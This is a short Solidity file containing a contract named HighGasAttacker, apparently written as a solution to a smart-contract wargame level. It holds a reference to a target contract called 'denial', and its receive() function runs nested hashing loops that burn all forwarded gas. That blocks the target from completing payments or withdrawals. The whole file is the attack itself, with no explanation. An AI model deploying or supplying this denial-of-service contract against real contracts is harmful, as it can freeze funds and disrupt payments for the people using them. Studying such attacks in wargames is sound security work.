pragma solidity ^0.8.0;

contract HighGasAttacker {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 val = keccak256(abi.encodePacked(i));
            for (uint256 j = 0; j < 10000; j++) {
                val = keccak256(abi.encodePacked(val, j));
            }
        }
    }
}